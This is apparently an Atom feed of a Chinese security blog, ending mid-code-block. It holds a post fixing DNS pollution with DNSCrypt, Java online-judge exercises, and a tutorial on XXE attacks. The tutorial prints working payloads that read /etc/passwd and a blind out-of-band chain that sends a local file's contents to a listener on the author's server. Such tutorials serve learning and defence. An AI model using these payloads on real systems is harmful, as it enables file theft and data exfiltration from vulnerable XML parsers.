<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>白仁的博客</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://bai-ren-1.github.io/"/>
  <updated>2020-07-31T03:38:17.926Z</updated>
  <id>http://bai-ren-1.github.io/</id>
  
  <author>
    <name>白仁</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>博客挟持证书解决</title>
    <link href="http://bai-ren-1.github.io/2020/07/31/%E5%8D%9A%E5%AE%A2%E6%8C%9F%E6%8C%81%E8%AF%81%E4%B9%A6%E8%A7%A3%E5%86%B3/"/>
    <id>http://bai-ren-1.github.io/2020/07/31/%E5%8D%9A%E5%AE%A2%E6%8C%9F%E6%8C%81%E8%AF%81%E4%B9%A6%E8%A7%A3%E5%86%B3/</id>
    <published>2020-07-31T02:34:13.000Z</published>
    <updated>2020-07-31T03:38:17.926Z</updated>
    
    <content type="html"><![CDATA[<h1 id="博客挟持证书解决"><a href="#博客挟持证书解决" class="headerlink" title="博客挟持证书解决"></a>博客挟持证书解决</h1><p>像往常一样打开我的博客，结果发现被证书挟持了。我笑了。点开是一个提示VMWare的证书，2019年就到期。</p><h2 id="0x00-寻求解决"><a href="#0x00-寻求解决" class="headerlink" title="0x00 寻求解决"></a>0x00 寻求解决</h2><p>打开之后会提示证书有问题，想钓鱼钓到我头上来了：</p><p><img src="/2020/07/31/%E5%8D%9A%E5%AE%A2%E6%8C%9F%E6%8C%81%E8%AF%81%E4%B9%A6%E8%A7%A3%E5%86%B3/1.png" alt></p><p>搜索一下发现github.io页也有别人发生一样的问题：<a href="https://www.v2ex.com/t/694065。依据里面的说法的话使用" target="_blank" rel="noopener">https://www.v2ex.com/t/694065。依据里面的说法的话使用</a> DNSCrypt  即可解决这个问题，且发生这个问题是出现了 dns 污染 。然后就去安装 DNSCrypt 啦，官网的地址如下： <a href="https://simplednscrypt.org/" target="_blank" rel="noopener">https://simplednscrypt.org/</a> </p><blockquote><p>这里的DNSCrypt其实是简易版的啦，亲测可以解决。</p></blockquote><p><img src="/2020/07/31/%E5%8D%9A%E5%AE%A2%E6%8C%9F%E6%8C%81%E8%AF%81%E4%B9%A6%E8%A7%A3%E5%86%B3/2.png" alt></p><p>配置好选项后选择网卡，然后打开service按钮，即可加密DNS啦。使用之后访问博客：</p><p><img src="/2020/07/31/%E5%8D%9A%E5%AE%A2%E6%8C%9F%E6%8C%81%E8%AF%81%E4%B9%A6%E8%A7%A3%E5%86%B3/3.png" alt></p><p>然后要关闭服务的时候记得点一下remove service，不然可能访问不了国内的网站了：</p><p><img src="/2020/07/31/%E5%8D%9A%E5%AE%A2%E6%8C%9F%E6%8C%81%E8%AF%81%E4%B9%A6%E8%A7%A3%E5%86%B3/4.png" alt></p><h2 id="0x01-寻求原因"><a href="#0x01-寻求原因" class="headerlink" title="0x01 寻求原因"></a>0x01 寻求原因</h2><blockquote><p>下面如果没开启DNSCrypt会将DNS解析到本地上，明显是个错误的地址。</p></blockquote><p><img src="/2020/07/31/%E5%8D%9A%E5%AE%A2%E6%8C%9F%E6%8C%81%E8%AF%81%E4%B9%A6%E8%A7%A3%E5%86%B3/5.png" alt></p><blockquote><p>开启了DNSCrypt后能解析到公网地址</p></blockquote><p><img src="/2020/07/31/%E5%8D%9A%E5%AE%A2%E6%8C%9F%E6%8C%81%E8%AF%81%E4%B9%A6%E8%A7%A3%E5%86%B3/6.png" alt></p><p>开启前后返回不一样的解析结果，应该是DNS服务器被挟持了吧。结合帖子的内容应该是BGP挟持攻击了DNS服务器，然后通过DNS挟持或DNS污染来导致我们在访问博客时给我们返回错误的ip地址吧。以前好像也有挺多类似的手法：<a href="https://www.freebuf.com/articles/paper/180167.html，如下图所示：" target="_blank" rel="noopener">https://www.freebuf.com/articles/paper/180167.html，如下图所示：</a></p><p><img src="/2020/07/31/%E5%8D%9A%E5%AE%A2%E6%8C%9F%E6%8C%81%E8%AF%81%E4%B9%A6%E8%A7%A3%E5%86%B3/7.png" alt></p><h2 id="0x02-DNS挟持"><a href="#0x02-DNS挟持" class="headerlink" title="0x02 DNS挟持"></a>0x02 DNS挟持</h2><p><strong>DNS劫持</strong>一般指域名劫持。<strong>域名劫持</strong>是互联网攻击的一种方式，通过攻击域名解析服务器（DNS），或伪造域名解析服务器（DNS）的方法，把目标网站域名解析到错误的IP地址从而实现用户无法访问目标网站的目的或者蓄意或恶意要求用户访问指定IP地址的目的。</p><blockquote><p>DNS污染是DNS挟持的一种攻击形式。</p></blockquote><h2 id="0x03-DNS污染"><a href="#0x03-DNS污染" class="headerlink" title="0x03 DNS污染"></a>0x03 DNS污染</h2><p><strong>网域服务器缓存污染</strong>（DNS cache pollution），又称<strong>域名服务器缓存投毒</strong>（DNS cache poisoning），是指一些刻意制造或无意中制造出来的域名服务器数据包，把域名指往不正确的IP地址。</p><p>一般来说，在互联网上都有可信赖的网域服务器，但为减低网络上的流量压力，一般的域名服务器都会把从上游的域名服务器获得的解析记录暂存起来，待下次有其他机器要求解析域名时，可以立即提供服务。一旦有关网域的局域域名服务器的缓存受到污染，就会把网域内的计算机导引往错误的服务器或服务器的网址。</p><h2 id="0x04-防止"><a href="#0x04-防止" class="headerlink" title="0x04 防止"></a>0x04 防止</h2><p>使用DNSCrypt对DNS请求进行加密，就可以防止DNS挟持/污染啦。使用方法就和上面写的是一样的。</p><h2 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h2><ul><li><a href="https://www.v2ex.com/t/694065" target="_blank" rel="noopener">https://www.v2ex.com/t/694065</a></li><li><a href="https://www.freebuf.com/articles/paper/180167.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/paper/180167.html</a></li><li><a href="https://www.williamlong.info/archives/3890.html" target="_blank" rel="noopener">https://www.williamlong.info/archives/3890.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;博客挟持证书解决&quot;&gt;&lt;a href=&quot;#博客挟持证书解决&quot; class=&quot;headerlink&quot; title=&quot;博客挟持证书解决&quot;&gt;&lt;/a&gt;博客挟持证书解决&lt;/h1&gt;&lt;p&gt;像往常一样打开我的博客，结果发现被证书挟持了。我笑了。点开是一个提示VMWare的证书，20
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>XXE三种攻击方式</title>
    <link href="http://bai-ren-1.github.io/2020/07/29/XXE%E4%B8%89%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/"/>
    <id>http://bai-ren-1.github.io/2020/07/29/XXE%E4%B8%89%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/</id>
    <published>2020-07-29T04:48:33.000Z</published>
    <updated>2020-07-31T02:34:38.432Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XXE三种攻击方式"><a href="#XXE三种攻击方式" class="headerlink" title="XXE三种攻击方式"></a>XXE三种攻击方式</h1><p>本来从来没想过记录这些基础漏洞的使用方法，但这个XXE老是临到用时就忘记，就记一记吧。危害一般都是读文件、内网端口探测、攻击内网网站等 。</p><h2 id="0x00-外部实体"><a href="#0x00-外部实体" class="headerlink" title="0x00  外部实体"></a>0x00  外部实体</h2><p>XML文档结构包括：</p><ul><li>XML声明</li><li>DTD文档类型定义（可选）</li><li>文档元素</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML声明--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span> </span><br><span class="line"><span class="comment">&lt;!--文档类型定义--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE note [  &lt;!--定义此文档是 note 类型的文档--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!--定义note元素有四个元素--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT to (#PCDATA)&gt;     &lt;!--定义to元素为"#PCDATA"类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT from (#PCDATA)&gt;   &lt;!--定义from元素为"#PCDATA"类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT head (#PCDATA)&gt;   &lt;!--定义head元素为"#PCDATA"类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT body (#PCDATA)&gt;   &lt;!--定义body元素为"#PCDATA"类型--&gt;</span></span><br><span class="line"><span class="meta">]]]&gt;</span></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>You are a good man<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>上面是一份完整的XML文档定义，具有XML声明、DTD文档类型定义和文档元素三部分。上面已经展示的很直观了不多解释。</p></blockquote><p>进行XXE攻击第一步先<strong>声明XML声明</strong>，然后进行<strong>DTD文档类型的声明</strong>。</p><ul><li>内部声明DTD:</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span></span><br></pre></td></tr></table></figure><ul><li>引用外部DTD:</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 SYSTEM "文件名"&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p> 可以嵌入在XML文档中(内部声明)，也可以独立的放在另外一个单独的文件中(外部引用)。 </p></blockquote><p>其中需要知道DTD中的一些重要的关键字：</p><ul><li>DOCTYPE（DTD的声明）</li><li>ENTITY（实体的声明）</li><li>SYSTEM、PUBLIC（外部资源申请）</li></ul><p>XXE叫做XML外部实体注入，我们直接看如何在外部DTD文档声明中<strong>声明实体</strong>：</p><p>其中关于实体，用到最多的类型是<strong>一般实体</strong>和<strong>参数实体</strong></p><ul><li>一般实体的声明： </li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体内容&quot;&gt;</span><br></pre></td></tr></table></figure><ul><li>参数实体的声明：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % 实体名称 &quot;实体内容&quot;&gt;</span><br></pre></td></tr></table></figure><blockquote><p>上面我们是了解不同实体之间符号的区别，主要在于格式。XXE关键还是下面的内外部实体的区分。</p></blockquote><ul><li>内部实体声明：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure><ul><li>外部实体声明：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br></pre></td></tr></table></figure><blockquote><p>所以区分内/外部实体和区分内/外部DTD是一样的，有SYSTEM标识符就是外部的，否则为内部的。</p></blockquote><p>只要如何声明实体后我们还得知道如何<strong>引用实体</strong>：</p><ul><li>参数实体用%实体名称申明，引用时也用%实体名称。</li><li>其余实体直接用实体名称申明，引用时用&amp;实体名称。</li><li>参数实体只能在DTD中申明，DTD中引用。</li><li>其余实体只能在DTD中申明，可在xml文档中引用。 </li></ul><p>最后贴上外部实体在每种不同的环境下默认可以<strong>使用的协议</strong>列表。</p><p><img src="/2020/07/29/XXE%E4%B8%89%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/1.png" alt></p><p>结合着上面知识来一个XXE的最常见payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [&lt;!ENTITY passwd SYSTEM "file:///etc/passwd"&gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>&amp;passwd;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>上面先是声明是个XML文档，随后声明一个内部DTD文档。DTD文档中通过SYSTEM标识符声明了一个外部实体passwd。然后XML文档元素中通&amp;进行外部实体的引用。</p></blockquote><h2 id="0x01-基础攻击"><a href="#0x01-基础攻击" class="headerlink" title="0x01 基础攻击"></a>0x01 基础攻击</h2><blockquote><p>基础的XXE注入— 外部实体注入本地DTD。</p></blockquote><p>下面这张图片用的是一个挺有名的XXE测试靶场，懒得复现就直接提上来。这里就是直接引入一个内部DTD，里面声明了外部实体获取/etc/passwd/的内容然后解析出来并获取解析的结果。</p><p><img src="/2020/07/29/XXE%E4%B8%89%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/2.png" alt></p><p>但很多时候解析之后的结果不会给你看到，那就需要盲注的手法了。</p><h2 id="0x02-盲注攻击"><a href="#0x02-盲注攻击" class="headerlink" title="0x02 盲注攻击"></a>0x02 盲注攻击</h2><blockquote><p>基于盲注的XXE注入—XML解析器在响应中不显示任何错误。</p></blockquote><p>首先在自己的VPS上准备好test.dtd作为一会引入的外部dtd：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///D:/test.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &apos;http://ip:9999?p=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>在XXE漏洞服务器上发送payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>然后在VPS的9999端口监听，获取到敏感信息的内容</p><p><img src="/2020/07/29/XXE%E4%B8%89%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/3.png" alt></p><p>总结上面XXE盲打的调用过程：</p><ul><li>payload中连续调用了三个参数实体 %remote;%int;%send。</li><li>调用%remote实体后请求了VPS上的 test.dtd ，类似于将 test.dtd 包含进来。</li><li>调用%int实体调用了test.dtd 中的%file实体，%file实体获取文件内容并填入到%send实体的内容中。</li><li>调用%send实体把需要的数据发送到VPS的监听端口上。</li></ul><h2 id="0x03-显错攻击"><a href="#0x03-显错攻击" class="headerlink" title="0x03 显错攻击"></a>0x03 显错攻击</h2><blockquote><p>基于错误的XXE注入—成功解析之后，XML解析器始终显示SAME响应。（即“您的消息已被接收”），因此，我们可能希望解析器将文件的内容“打印”到错误响应中。</p></blockquote><p>有时候，当解析过程成功时，当我们从服务器得到通用的响应时，我们可能希望服务器返回详细错误—因此，我们可以使用与远程DTD相同的技术，但会发生故意的错误如： </p><p><img src="/2020/07/29/XXE%E4%B8%89%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/4.png" alt></p><p>解析器将尝试解析DTD并访问发送实体中给出的路径，但是由于不能到达“my-evil-domain.$$$$”，我们将导致以下错误： </p><p><img src="/2020/07/29/XXE%E4%B8%89%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/5.png" alt></p><h2 id="0x04-链接"><a href="#0x04-链接" class="headerlink" title="0x04 链接"></a>0x04 链接</h2><ul><li><a href="https://www.secpulse.com/archives/58915.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/58915.html</a> </li><li><a href="https://xz.aliyun.com/t/3357#toc-8" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357#toc-8</a> </li><li><a href="https://www.jianshu.com/p/7325b2ef8fc9" target="_blank" rel="noopener">https://www.jianshu.com/p/7325b2ef8fc9</a> </li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;XXE三种攻击方式&quot;&gt;&lt;a href=&quot;#XXE三种攻击方式&quot; class=&quot;headerlink&quot; title=&quot;XXE三种攻击方式&quot;&gt;&lt;/a&gt;XXE三种攻击方式&lt;/h1&gt;&lt;p&gt;本来从来没想过记录这些基础漏洞的使用方法，但这个XXE老是临到用时就忘记，就记一记吧
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>OJ刷题记录</title>
    <link href="http://bai-ren-1.github.io/2020/07/27/OJ%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>http://bai-ren-1.github.io/2020/07/27/OJ%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2020-07-27T12:54:58.000Z</published>
    <updated>2020-07-27T13:22:18.345Z</updated>
    
    <content type="html"><![CDATA[<h1 id="OJ刷题记录"><a href="#OJ刷题记录" class="headerlink" title="OJ刷题记录"></a>OJ刷题记录</h1><p>菜，刷。两个字。大部分题目放在本地的IDEA中了，这里只是贴上一些老是忘记的点。</p><h2 id="0x00-华为OJ"><a href="#0x00-华为OJ" class="headerlink" title="0x00 华为OJ"></a>0x00 华为OJ</h2><h3 id="1-计算字符串个数"><a href="#1-计算字符串个数" class="headerlink" title="1. 计算字符串个数"></a>1. 计算字符串个数</h3><h4 id="题目概述"><a href="#题目概述" class="headerlink" title="题目概述"></a>题目概述</h4><p>这题难度标注是较难，个人感觉应该是标错了或者有更优解。不过搞安全的，这里不去探究最优解了，AC即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">题目描述</span></span><br><span class="line"><span class="comment">写出一个程序，接受一个由字母和数字组成的字符串，和一个字符，然后输出输入字符串中含有该字符的个数。不区分大小写。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输入描述:</span></span><br><span class="line"><span class="comment">第一行输入一个有字母和数字以及空格组成的字符串，第二行输入一个字符。</span></span><br><span class="line"><span class="comment">输出描述:</span></span><br><span class="line"><span class="comment">输出输入字符串中含有该字符的个数。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">示例1</span></span><br><span class="line"><span class="comment">输入:</span></span><br><span class="line"><span class="comment">ABCDEF</span></span><br><span class="line"><span class="comment">A</span></span><br><span class="line"><span class="comment">输出:1</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">package</span> NumOfAlpha;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        String string = scanner.nextLine();</span><br><span class="line">        String alpha = scanner.nextLine();</span><br><span class="line">        <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">char</span> ch:string.toCharArray())&#123;</span><br><span class="line">            String str;</span><br><span class="line">            str = Character.toString(ch);</span><br><span class="line">            <span class="keyword">if</span>(str.equalsIgnoreCase(alpha))&#123;      <span class="comment">// 比较两个String不能直接用==进行判断，需要使用equals方法</span></span><br><span class="line">                result++;                         <span class="comment">// 必须使用equalsIgnoreCase才能通过，直接equals不行</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="题目坑点"><a href="#题目坑点" class="headerlink" title="题目坑点"></a>题目坑点</h4><ul><li><strong>String类型</strong>比较不同对象内容是否相同，应该用equals。因为==用于比较引用类型和比较基本数据类型时具有不同的功能。 </li><li>equalsIgnoreCase() ：用于将字符串与指定的对象比较，<strong>不考虑大小写</strong>。</li><li>for(char ch:string.toCharArray())：常用于<strong>String转Char数组并遍历</strong>。</li></ul><h3 id="2-输出逆序的字符串"><a href="#2-输出逆序的字符串" class="headerlink" title="2. 输出逆序的字符串"></a>2. 输出逆序的字符串</h3><h4 id="题目概述-1"><a href="#题目概述-1" class="headerlink" title="题目概述"></a>题目概述</h4><p>标注简单，主要是记录老是要忘的字符串和字符之间的转换。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">将一个字符串str的内容颠倒过来，并输出。str的长度不超过100个字符。</span></span><br><span class="line"><span class="comment">如：输入“I am a student”，输出“tneduts a ma I”。</span></span><br><span class="line"><span class="comment">输入参数：inputString：输入的字符串</span></span><br><span class="line"><span class="comment">返回值：输出转换好的逆序字符串</span></span><br><span class="line"><span class="comment">输入描述：输入一个字符串，可以有空格</span></span><br><span class="line"><span class="comment">输出描述：输出逆序的字符串</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">示例1</span></span><br><span class="line"><span class="comment">输入：I am a student</span></span><br><span class="line"><span class="comment">输出：tneduts a ma I</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">package</span> Easy.ReverseString;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        String string = scanner.nextLine();</span><br><span class="line">        <span class="keyword">int</span> num = string.length();</span><br><span class="line">        StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();  <span class="comment">// 用来将字符拼接成字符串</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;num;i++)&#123;</span><br><span class="line">            Character word = string.charAt(num-<span class="number">1</span>-i);</span><br><span class="line">            stringBuilder.append(word);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(stringBuilder.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="题目坑点-1"><a href="#题目坑点-1" class="headerlink" title="题目坑点"></a>题目坑点</h4><ul><li>StringBuilder类似Python中的数组的方法来实现<strong>把字符添加在一个结构</strong>。</li><li>StringBuilder使用<strong>toString</strong>实现添加在一起的字符转为字符串。</li><li>charAt实现<strong>字符串提取某个字符</strong>。</li></ul><h3 id="3-最小公倍数"><a href="#3-最小公倍数" class="headerlink" title="3. 最小公倍数"></a>3. 最小公倍数</h3><h4 id="题目概述-2"><a href="#题目概述-2" class="headerlink" title="题目概述"></a>题目概述</h4><p>经典，没啥好解释。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">题目描述</span></span><br><span class="line"><span class="comment">正整数A和正整数B 的最小公倍数是指 能被A和B整除的最小的正整数值，设计一个算法，求输入A和B的最小公倍数。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输入描述:</span></span><br><span class="line"><span class="comment">输入两个正整数A和B。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输出描述:</span></span><br><span class="line"><span class="comment">输出A和B的最小公倍数。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">示例1</span></span><br><span class="line"><span class="comment">输入：5 7</span></span><br><span class="line"><span class="comment">输出：35</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">package</span> Easy.TheMinimumMultiple;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">while</span>(scanner.hasNext())&#123;</span><br><span class="line">            <span class="keyword">int</span> a = scanner.nextInt();</span><br><span class="line">            <span class="keyword">int</span> b = scanner.nextInt();</span><br><span class="line">            <span class="keyword">int</span> maximumConventions = MaximumConventions(a,b);</span><br><span class="line">            System.out.println(a*b/maximumConventions);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">MaximumConventions</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(a &lt; b)&#123;  <span class="comment">// 保证被除数大于除数</span></span><br><span class="line">            <span class="keyword">int</span> temp = a;</span><br><span class="line">            a = b;</span><br><span class="line">            b = temp;</span><br><span class="line">        &#125;<span class="keyword">while</span>(a % b != <span class="number">0</span>)&#123;     <span class="comment">// 除法余数不为0则循环</span></span><br><span class="line">            n = a % b;</span><br><span class="line">            a = b;      <span 